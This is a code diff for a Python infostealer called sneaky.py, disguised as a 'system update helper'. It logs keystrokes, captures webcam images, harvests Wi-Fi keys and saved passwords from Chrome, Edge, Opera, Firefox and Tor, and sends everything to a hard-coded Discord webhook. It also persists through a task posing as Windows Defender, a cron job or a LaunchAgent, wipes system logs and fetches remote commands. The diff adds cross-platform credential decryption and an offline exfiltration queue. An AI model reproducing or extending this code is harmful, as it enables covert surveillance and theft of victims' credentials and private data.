@@ -17,17 +17,30 @@ try:
     import cv2
     from pynput.keyboard import Listener
     import win32gui
+    import win32crypt
+    from Crypto.Cipher import AES
+    from Crypto.Protocol.KDF import PBKDF2
+    from Crypto.Util.Padding import unpad
+    import pyasn1.codec.der.decoder as der_decoder
 except ImportError as e:
     sys.stderr.write(f"critical import failed: {e}\n")
     sys.exit(1)
 
-VERSION = "2.4.5"
+try:
+    import keyring
+except ImportError:
+    keyring = None
+    sys.stderr.write("keyring unavailable; Linux/macOS browser creds may fail\n")
+
+VERSION = "2.4.9 DEV"
 TEMP_LOG = os.path.join(os.getenv("TEMP", "/tmp"), "system_update_helper.log")
 PYTHON_VERSION = sys.version_info
 IS_FSTRING = PYTHON_VERSION >= (3, 6)
 DEBUG = True
-IS_ADMIN = ctypes.windll.shell32.IsUserAnAdmin() != 0 if platform.system() == "Windows" and ctypes else True
-IS_WINDOWS = platform.system() == "Windows"
+IS_ADMIN = ctypes.windll.shell32.IsUserAnAdmin() != 0 if platform.system() == "Windows" and ctypes else False
+IS_WINDOWS = sys.platform.startswith("win")
+IS_LINUX = sys.platform.startswith("linux")
+IS_MACOS = sys.platform.startswith("darwin")
 HARVESTED_DATA = {}
 keylog_buffer = []
 keylog_file = os.path.join(os.getenv("TEMP", "/tmp"), "keylog.txt")
@@ -38,7 +51,10 @@ file_lock = threading.Lock()
 keylogger_stop = threading.Event()
 camera_in_use = False
 send_queue = []
+offline_queue = []
 send_lock = threading.Lock()
+session = requests.Session()
+session.mount("https://", requests.adapters.HTTPAdapter(pool_connections=10, pool_maxsize=10))
 
 def log_debug(msg, *args, exc_info=None):
     msg = msg if not args else msg % args
@@ -58,44 +74,113 @@ log_debug("script started - v%s", VERSION)
 def install_deps():
     log_debug("ensuring dependencies")
     pkgs = [
-        ("pywin32", "pywin32>=306"),
-        ("requests", "requests>=2.28.1"),
-        ("psutil", "psutil>=5.9.0"),
-        ("pynput", "pynput>=1.7.6"),
-        ("pillow", "Pillow>=9.0.0"),
-        ("opencv-python", "opencv-python>=4.5.5"),
-        ("pycryptodome", "pycryptodome>=3.15.0")
+        ("pywin32", "pywin32>=306", IS_WINDOWS), ("requests", "requests>=2.28.1", True),
+        ("psutil", "psutil>=5.9.0", True), ("pynput", "pynput>=1.7.6", True),
+        ("pillow", "Pillow>=11.1.0", True), ("opencv-python", "opencv-python>=4.11.0", True),
+        ("pycryptodome", "pycryptodome>=3.21.0", True), ("pyasn1", "pyasn1>=0.6.0", True),
+        ("keyring", "keyring>=24.3.0", IS_LINUX or IS_MACOS)
     ]
-    for dep, pkg in pkgs:
+    for dep, pkg, needed in pkgs:
+        if not needed: continue
         try:
             __import__(dep)
             log_debug("%s installed", dep)
         except ImportError:
             try:
-                subprocess.check_call([sys.executable, "-m", "pip", "install", "--user", pkg])
+                subprocess.check_call([sys.executable, "-m", "pip", "install", "--user", pkg, "-q"])
                 log_debug("installed %s via pip", pkg)
             except Exception as e:
                 log_debug("pip failed for %s: %s", pkg, e, exc_info=sys.exc_info())
-                return False
-    return True
+                if dep == "keyring":
+                    global keyring
+                    keyring = None
+                else:
+                    sys.exit(1)
+
+def install_nss():
+    if IS_LINUX:
+        log_debug("checking NSS installation on Linux")
+        try:
+            if subprocess.call(["dpkg", "-l", "libnss3"], stdout=subprocess.PIPE, stderr=subprocess.PIPE) != 0:
+                log_debug("installing NSS on Debian/Ubuntu")
+                subprocess.check_call(["sudo", "apt-get", "install", "-y", "-q", "libnss3", "libnss3-tools"])
+            elif subprocess.call(["rpm", "-q", "nss"], stdout=subprocess.PIPE, stderr=subprocess.PIPE) != 0:
+                log_debug("installing NSS on RHEL/CentOS")
+                subprocess.check_call(["sudo", "yum", "install", "-y", "-q", "nss"])
+        except Exception as e:
+            log_debug("NSS install failed on Linux: %s", e, exc_info=sys.exc_info())
+            try:
+                subprocess.check_call(["sudo", "dnf", "install", "-y", "-q", "nss"])
+            except:
+                try:
+                    subprocess.check_call(["sudo", "pacman", "-S", "--noconfirm", "nss"])
+                except:
+                    log_debug("all NSS install attempts failed")
+    elif IS_MACOS:
+        log_debug("checking NSS installation on macOS")
+        if subprocess.call(["brew", "list", "nss"], stdout=subprocess.PIPE, stderr=subprocess.PIPE) != 0:
+            if subprocess.call(["brew", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE) != 0:
+                log_debug("installing Homebrew")
+                subprocess.check_call(["/bin/bash", "-c", "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"])
+            log_debug("installing NSS via Homebrew")
+            subprocess.check_call(["brew", "install", "-q", "nss"])
 
 if not install_deps():
     log_debug("dependency install failed")
     sys.exit(1)
+if IS_LINUX or IS_MACOS:
+    install_nss()
 sys.stdout.write(f"[{datetime.now()}] *** running sneaky.py v{VERSION} *** - dependencies ok\n")
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1345280507545649212/0G9L_YVWq0KuH7GStQUbvHBxiAk8a5Y7pViIqdwXJcfw1zNBq2peSSl_kCTPKiARPfD4"
-HIDE_DIR = os.path.join(os.getenv("APPDATA", os.path.expanduser("~\\Application Data")), "systemutilities")
+HIDE_DIR = os.path.join(os.getenv("APPDATA", os.path.expanduser("~")), "systemutilities")
 HIDE_FILE = os.path.join(HIDE_DIR, "system_update_helper.py")
 PID_FILE = os.path.join(HIDE_DIR, ".autojug.pid")
+OFFLINE_DIR = os.path.join(HIDE_DIR, "offline_queue")
 
 def queue_for_send(data=None, file_path=None):
     with send_lock:
-        send_queue.append((data, file_path))
-    log_debug("queued data for send: file=%s, data_len=%s", file_path, len(data) if data else 'N/A')
+        if is_connected():
+            send_queue.append((data, file_path))
+            log_debug("queued data for send: file=%s, data_len=%s", file_path, len(data) if data else 'N/A')
+        else:
+            offline_store(data, file_path)
+            log_debug("stored offline: file=%s, data_len=%s", file_path, len(data) if data else 'N/A')
+
+def offline_store(data, file_path):
+    os.makedirs(OFFLINE_DIR, exist_ok=True)
+    if file_path and os.path.exists(file_path):
+        dest = os.path.join(OFFLINE_DIR, os.path.basename(file_path))
+        shutil.copy(file_path, dest)
+        offline_queue.append((None, dest))
+    elif data:
+        temp_file = os.path.join(OFFLINE_DIR, f"data_{random_string()}.txt")
+        with open(temp_file, "w", encoding="utf-8") as f:
+            f.write(str(data))
+        offline_queue.append((None, temp_file))
+
+def is_connected():
+    try:
+        socket.create_connection(("8.8.8.8", 53), timeout=5)
+        return True
+    except OSError:
+        return False
+
+def handle_offline_queue():
+    while not keylogger_stop.is_set():
+        if is_connected() and offline_queue:
+            log_debug("connection restored, waiting 2min before sending offline queue")
+            time.sleep(120)  # 2-minute delay after reconnect
+            with send_lock:
+                send_queue.extend(offline_queue)
+                offline_queue.clear()
+                shutil.rmtree(OFFLINE_DIR, ignore_errors=True)
+                log_debug("offline queue transferred to send queue")
+        time.sleep(30)
 
 def send_to_discord():
     global send_queue
+    retry_delay = 1
     while not keylogger_stop.is_set():
         with send_lock:
             if not send_queue:
@@ -110,9 +195,10 @@ def send_to_discord():
             for _ in range(3):
                 try:
                     with open(file_path, "rb") as f:
-                        response = requests.post(WEBHOOK_URL, files={"file": f}, timeout=10)
-                    if response.status_code == 200 or response.status_code == 204:
+                        response = session.post(WEBHOOK_URL, files={"file": f}, timeout=10)
+                    if response.status_code in (200, 204):
                         log_debug("file sent successfully: %s", file_path)
+                        retry_delay = 1
                     elif response.status_code == 429:
                         log_debug("rate limited by Discord, waiting 2 minutes")
                         time.sleep(120)
@@ -126,7 +212,8 @@ def send_to_discord():
                     break
                 except Exception as e:
                     log_debug("file send failed: %s", e, exc_info=sys.exc_info())
-                    time.sleep(2)
+                    time.sleep(retry_delay)
+                    retry_delay = min(retry_delay * 2, 60)
         elif data:
             data_str = str(data)
             temp_file = os.path.join(os.getenv("TEMP", "/tmp"), f"data_{random_string()}.txt")
@@ -135,9 +222,10 @@ def send_to_discord():
             for _ in range(3):
                 try:
                     with open(temp_file, "rb") as f:
-                        response = requests.post(WEBHOOK_URL, files={"file": (os.path.basename(temp_file), f)}, timeout=10)
-                    if response.status_code == 200 or response.status_code == 204:
+                        response = session.post(WEBHOOK_URL, files={"file": (os.path.basename(temp_file), f)}, timeout=10)
+                    if response.status_code in (200, 204):
                         log_debug("text data sent successfully as file: %s", temp_file)
+                        retry_delay = 1
                     elif response.status_code == 429:
                         log_debug("rate limited by Discord, waiting 2 minutes")
                         time.sleep(120)
@@ -151,7 +239,8 @@ def send_to_discord():
                     break
                 except Exception as e:
                     log_debug("text send failed: %s", e, exc_info=sys.exc_info())
-                    time.sleep(2)
+                    time.sleep(retry_delay)
+                    retry_delay = min(retry_delay * 2, 60)
         time.sleep(30)
 
 def manage_instance():
@@ -168,7 +257,7 @@ def manage_instance():
                 pass
             elif psutil.pid_exists(pid):
                 proc = psutil.Process(pid)
-                if proc.name() == sys.executable.split('\\')[-1]:
+                if proc.name() == sys.executable.split(os.sep)[-1]:
                     raise RuntimeError(f"another instance running with pid {pid}")
                 else:
                     should_clean = True
@@ -186,8 +275,16 @@ def persist():
     if IS_WINDOWS and IS_ADMIN and winreg:
         cmd = f'schtasks /create /tn windowsdefenderhealthservice /tr "\"{sys.executable}\" \"{HIDE_FILE}\"" /sc ONSTART /ru SYSTEM /f'
         subprocess.run(cmd, shell=True)
-    else:
-        log_debug("no admin privileges or unsupported os; persistence limited")
+    elif IS_LINUX:
+        cron = f"@reboot {sys.executable} {HIDE_FILE}"
+        subprocess.run(f"(crontab -l 2>/dev/null; echo '{cron}') | crontab -", shell=True)
+    elif IS_MACOS:
+        plist = f"""<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0"><dict><key>Label</key><string>com.systemutilities</string><key>ProgramArguments</key><array><string>{sys.executable}</string><string>{HIDE_FILE}</string></array><key>RunAtLoad</key><true/></dict></plist>"""
+        with open(os.path.expanduser("~/Library/LaunchAgents/com.systemutilities.plist"), "w") as f:
+            f.write(plist)
+        subprocess.run(["launchctl", "load", os.path.expanduser("~/Library/LaunchAgents/com.systemutilities.plist")])
 
 def random_string(n=8):
     return ''.join(random.choices(string.ascii_lowercase, k=n))
@@ -243,15 +340,15 @@ def keylogger():
             key_char = key.char if hasattr(key, 'char') and key.char else str(key)
             if key_char == " ":
                 with buffer_lock:
-                    keylog_buffer.append(f"{datetime.now()} - Line: {' '.join(line_buffer)} - Window: {window}")
-                    log_debug("keylog line buffered: %s", ' '.join(line_buffer))
+                    keylog_buffer.append(f"{datetime.now()} - Line: {''.join(line_buffer)} - Window: {window}")
+                    log_debug("keylog line buffered: %s", ''.join(line_buffer))
                 line_buffer.clear()
             else:
                 line_buffer.append(key_char)
                 if len(line_buffer) >= 24:
                     with buffer_lock:
-                        keylog_buffer.append(f"{datetime.now()} - Line: {' '.join(line_buffer)} - Window: {window}")
-                        log_debug("keylog line buffered (max reached): %s", ' '.join(line_buffer))
+                        keylog_buffer.append(f"{datetime.now()} - Line: {''.join(line_buffer)} - Window: {window}")
+                        log_debug("keylog line buffered (max reached): %s", ''.join(line_buffer))
                     line_buffer.clear()
         except AttributeError:
             pass
@@ -261,6 +358,61 @@ def keylogger():
     except Exception as e:
         log_debug("keylogger error: %s", e, exc_info=sys.exc_info())
         queue_for_send(f"keylogger error: {e}")
+
+def extract_chrome_passwords(path):
+    if not os.path.exists(path):
+        return {}
+    try:
+        conn = sqlite3.connect(path)
+        cursor = conn.execute("SELECT origin_url, username_value, password_value FROM logins")
+        results = {}
+        if IS_WINDOWS:
+            results = {row[0]: (row[1], win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1].decode()) for row in cursor.fetchall()}
+        elif IS_LINUX and keyring:
+            key = keyring.get_password("chromium", "default") or subprocess.check_output(["secret-tool", "lookup", "application", "chromium"]).strip()
+            for row in cursor.fetchall():
+                url, user, enc_pass = row
+                cipher = AES.new(key.encode(), AES.MODE_CBC, iv=enc_pass[3:19])
+                results[url] = (user, unpad(cipher.decrypt(enc_pass[19:]), AES.block_size).decode())
+        elif IS_MACOS and keyring:
+            key = keyring.get_password("Chrome Safe Storage", "Chrome") or subprocess.check_output(["security", "find-generic-password", "-s", "Chrome Safe Storage", "-w"]).strip()
+            for row in cursor.fetchall():
+                url, user, enc_pass = row
+                cipher = AES.new(PBKDF2(key.encode(), b"saltysalt", 16, 1003), AES.MODE_CBC, iv=enc_pass[3:19])
+                results[url] = (user, unpad(cipher.decrypt(enc_pass[19:]), AES.block_size).decode())
+        conn.close()
+        return results
+    except Exception as e:
+        log_debug("chrome extract failed: %s", e, exc_info=sys.exc_info())
+        return {}
+
+def extract_firefox_passwords(profile_path):
+    logins_file = os.path.join(profile_path, "logins.json")
+    if not os.path.exists(logins_file):
+        return {}
+    try:
+        with open(logins_file, "r") as f:
+            logins = json.load(f).get("logins", [])
+        results = {}
+        key_file = os.path.join(profile_path, "key4.db")
+        if os.path.exists(key_file):
+            conn = sqlite3.connect(key_file)
+            cursor = conn.execute("SELECT a11 FROM nssPrivate WHERE a102 = ?", (bytes.fromhex("f8000000000000000000000000000001"),))
+            global_salt = cursor.fetchone()[0]
+            conn.close()
+            for login in logins:
+                enc_user = der_decoder.decode(login["encryptedUsername"])[0].asOctets()
+                enc_pass = der_decoder.decode(login["encryptedPassword"])[0].asOctets()
+                key = PBKDF2(global_salt, b"", 32, 1)[:16]
+                cipher = AES.new(key, AES.MODE_CBC, iv=enc_user[16:32])
+                user = unpad(cipher.decrypt(enc_user[32:]), AES.block_size).decode()
+                cipher = AES.new(key, AES.MODE_CBC, iv=enc_pass[16:32])
+                passwd = unpad(cipher.decrypt(enc_pass[32:]), AES.block_size).decode()
+                results[login["hostname"]] = (user, passwd)
+        return results
+    except Exception as e:
+        log_debug("firefox extract failed: %s", e, exc_info=sys.exc_info())
+        return {}
 
 def harvest_data(is_initial_harvest):
     global HARVESTED_DATA
@@ -273,39 +425,53 @@ def harvest_data(is_initial_harvest):
             "username": getpass.getuser()
         },
         "wifi": {},
-        "creds": {
-            "system": f"{getpass.getuser()}:{os.getenv('AUTOJUG_PASS', 'N/A')}",
-            "browser": {}
-        }
+        "creds": {"system": f"{getpass.getuser()}:{os.getenv('AUTOJUG_PASS', 'N/A')}", "browser": {}}
     }
     if IS_WINDOWS:
         try:
             profiles = subprocess.check_output("netsh wlan show profiles", shell=True).decode().splitlines()
-            wifi_data = {}
-            for line in profiles:
-                if "All User Profile" in line:
-                    profile_name = line.split("All User Profile")[1].strip()[2:]
-                    key_output = subprocess.check_output(f'netsh wlan show profile name="{profile_name}" key=clear', shell=True).decode()
-                    if "Key Content" in key_output:
-                        password = key_output.split("Key Content")[1].strip().split("\r\n")[0].strip()
-                        wifi_data[profile_name] = password
-            current_data["wifi"] = wifi_data
+            current_data["wifi"] = {line.split("All User Profile")[1].strip()[2:]: subprocess.check_output(f'netsh wlan show profile name="{line.split("All User Profile")[1].strip()[2:]}" key=clear', shell=True).decode().split("Key Content")[1].strip().split("\r\n")[0].strip() for line in profiles if "All User Profile" in line}
         except Exception as e:
             log_debug("wifi harvest failed: %s", e, exc_info=sys.exc_info())
-    if is_initial_harvest:
+        browser_paths = {
+            "chrome": os.path.join(os.getenv("APPDATA", ""), "..", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"),
+            "edge": os.path.join(os.getenv("APPDATA", ""), "..", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data"),
+            "opera": os.path.join(os.getenv("APPDATA", ""), "Opera Software", "Opera Stable", "Login Data"),
+            "firefox": glob.glob(os.path.join(os.getenv("APPDATA", ""), "Mozilla", "Firefox", "Profiles", "*.default-release")),
+            "tor": glob.glob(os.path.join(os.getenv("APPDATA", ""), "Tor Browser", "Browser", "Tor", "Profile"))
+        }
+    elif IS_LINUX:
         try:
-            chrome_db = os.path.join(os.getenv("APPDATA", ""), "..", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
-            if os.path.exists(chrome_db):
-                with sqlite3.connect(chrome_db) as conn:
-                    cursor = conn.execute("SELECT origin_url, password_value FROM logins")
-                    current_data["creds"]["browser"]["chrome"] = {row[0]: row[1] for row in cursor.fetchall()}
-            firefox_db = glob.glob(os.path.join(os.getenv("APPDATA", ""), "Mozilla", "Firefox", "Profiles", "*", "logins.json"))
-            if firefox_db and os.path.exists(firefox_db[0]):
-                with open(firefox_db[0], "r") as f:
-                    logins = json.load(f).get("logins", [])
-                    current_data["creds"]["browser"]["firefox"] = {login["hostname"]: login["encryptedPassword"] for login in logins}
-        except Exception as e:
-            log_debug("browser creds harvest failed: %s", e, exc_info=sys.exc_info())
+            profiles = subprocess.check_output(["nmcli", "-t", "-f", "NAME", "con", "show"]).decode().splitlines()
+            current_data["wifi"] = {p: subprocess.check_output(["nmcli", "-s", "-t", "-f", "connection.id,802-11-wireless-security.psk", "con", "show", p]).decode().split(":")[1].strip() for p in profiles if "wifi" in subprocess.check_output(["nmcli", "-t", "-f", "TYPE", "con", "show", p]).decode()}
+        except:
+            pass
+        browser_paths = {
+            "chrome": os.path.expanduser("~/.config/google-chrome/Default/Login Data"),
+            "edge": os.path.expanduser("~/.config/microsoft-edge/Default/Login Data"),
+            "opera": os.path.expanduser("~/.config/opera/Login Data"),
+            "firefox": glob.glob(os.path.expanduser("~/.mozilla/firefox/*.default-release")),
+            "tor": glob.glob(os.path.expanduser("~/.tor-browser/profile"))
+        }
+    elif IS_MACOS:
+        try:
+            profiles = subprocess.check_output(["airport", "-s"]).decode().splitlines()[1:]
+            current_data["wifi"] = {line.split()[0]: subprocess.check_output(["security", "find-generic-password", "-s", line.split()[0], "-w"]).decode().strip() for line in profiles if line}
+        except:
+            pass
+        browser_paths = {
+            "chrome": os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/Login Data"),
+            "edge": os.path.expanduser("~/Library/Application Support/Microsoft Edge/Default/Login Data"),
+            "opera": os.path.expanduser("~/Library/Application Support/com.operasoftware.Opera/Login Data"),
+            "firefox": glob.glob(os.path.expanduser("~/Library/Application Support/Firefox/Profiles/*.default-release")),
+            "tor": glob.glob(os.path.expanduser("~/Library/Application Support/TorBrowser-Data/Browser/*.default"))
+        }
+    if is_initial_harvest:
+        for browser, path in browser_paths.items():
+            if browser in ("chrome", "edge", "opera"):
+                current_data["creds"]["browser"][browser] = extract_chrome_passwords(path) if not isinstance(path, list) else {}
+            elif browser in ("firefox", "tor") and path:
+                current_data["creds"]["browser"][browser] = extract_firefox_passwords(path[0]) if path else {}
         HARVESTED_DATA = current_data.copy()
         queue_for_send(json.dumps(current_data))
     else:
@@ -329,6 +495,10 @@ def clean_traces():
     log_debug("cleaning traces")
     if IS_WINDOWS and IS_ADMIN:
         [subprocess.run(cmd, shell=True) for cmd in ['wevtutil cl system', 'wevtutil cl security', 'wevtutil cl application']]
+    elif IS_LINUX:
+        subprocess.run(["sudo", "journalctl", "--vacuum-time=1s"])
+    elif IS_MACOS:
+        subprocess.run(["sudo", "rm", "-rf", "/var/log/*"])
 
 def check_camera_usage():
     global camera_in_use
@@ -416,7 +586,8 @@ def main():
         threading.Thread(target=periodic_harvest, daemon=True),
         threading.Thread(target=check_camera_usage, daemon=True),
         threading.Thread(target=sneaky_selfie_thread, daemon=True),
-        threading.Thread(target=send_to_discord, daemon=True)
+        threading.Thread(target=send_to_discord, daemon=True),
+        threading.Thread(target=handle_offline_queue, daemon=True)
     ]
     for t in threads:
         t.start()
@@ -447,7 +618,7 @@ class CommandHandler:
         log_debug("fetching commands")
         for url in self.fallback_urls:
             try:
-                resp = requests.get(url, timeout=5)
+                resp = session.get(url, timeout=5)
                 log_debug("got raw response: %s", resp.text[:100])
                 self.parse_commands(resp.text)
                 break
